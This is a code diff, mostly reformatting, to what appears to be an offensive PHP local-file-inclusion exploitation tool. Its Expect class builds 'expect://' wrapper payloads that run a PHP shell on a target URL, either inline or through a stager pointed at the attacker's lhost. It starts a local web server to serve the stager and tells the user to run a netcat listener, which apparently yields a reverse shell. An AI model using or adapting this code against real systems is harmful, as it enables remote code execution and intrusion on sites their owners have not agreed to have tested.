@@ -12,7 +12,6 @@ HERE = abspath(dirname(__file__))
 
 class Expect:
     def __init__(self, args):
-
         self.target = args.url
         self.nostager = args.nostager
         self.cookies = args.cookies
@@ -41,20 +40,27 @@ class Expect:
         if self.nostager:
             print(colors("[~] No-Staged Selected!", 93))
             with open("/tmp/{0}.php".format(shell), "r") as f:
-                payload = "expect://echo \""
-                payload += quote(f.read().replace("\"", "\\\"").replace("$", "\\$"))
-                payload += "\" | php"
+                payload = 'expect://echo "'
+                payload += quote(f.read().replace('"', '\\"').replace("$", "\\$"))
+                payload += '" | php'
         else:
-            payload = "expect://echo \"" + STAGER.format(lhost, shell) + "\" | php"
+            payload = 'expect://echo "' + STAGER.format(lhost, shell) + '" | php'
             print(colors("[~] Starting Web Server ... ", 93))
 
             try:
-                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
+                p = subprocess.Popen(
+                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
+                )
                 p.communicate()
             except OSError as os_error:
                 print(colors("[!] Process Error", 91))
                 print(os_error)
-        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
+        input(
+            colors(
+                "[?] Press Enter To Continue When Your netcat listener is Running ...",
+                94,
+            )
+        )
 
         if self.cookies:
             cookies = cook(self.cookies)
